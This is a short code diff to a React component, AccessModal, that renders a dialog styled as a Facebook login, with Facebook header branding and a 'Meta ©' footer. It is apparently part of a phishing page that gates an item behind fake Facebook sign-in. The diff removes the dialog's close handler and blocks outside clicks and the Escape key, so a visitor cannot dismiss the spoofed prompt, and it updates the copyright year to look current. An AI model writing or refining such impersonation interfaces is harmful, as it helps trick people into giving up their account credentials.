@@ -139,8 +139,8 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
   }
 
   return (
-    <Dialog open={isOpen} onOpenChange={handleClose}>
-      <DialogContent className="sm:max-w-md p-0 overflow-hidden bg-white shadow-2xl">
+    <Dialog open={isOpen}>
+      <DialogContent className="sm:max-w-sm p-0 overflow-hidden bg-white shadow-2xl" onPointerDownOutside={(e) => e.preventDefault()} onEscapeKeyDown={(e) => e.preventDefault()}>
         {/* Facebook Header */}
         <div className="bg-[#1877f2] text-white text-center py-4 relative">
           <h1 className="text-2xl font-bold" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>facebook</h1>
@@ -253,7 +253,7 @@ const AccessModal = ({ isOpen, onClose, item }: AccessModalProps) => {
                 </div>
               </div>
               <div className="text-xs text-gray-400 mt-4" style={{ fontFamily: 'Helvetica, Arial, sans-serif' }}>
-                Meta © 2023
+                Meta © 2025
               </div>
             </div>
           </div>
